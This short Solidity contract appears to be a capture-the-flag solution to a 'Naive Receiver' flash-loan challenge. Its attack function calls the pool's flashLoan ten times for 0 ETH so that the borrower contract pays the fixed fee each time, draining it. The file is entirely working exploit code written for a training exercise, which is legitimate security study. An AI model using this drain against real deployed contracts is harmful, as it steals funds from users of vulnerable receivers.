// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
    function attack(NaiveReceiverLenderPool naiveReceiverLenderPool, address borrower) external {
        for (uint256 i = 0; i < 10; ++i) {
            // A flashLoan for 0 ETH still forces the borrower to pay the fixed fee!
            naiveReceiverLenderPool.flashLoan(borrower, 0);
        }
    }
}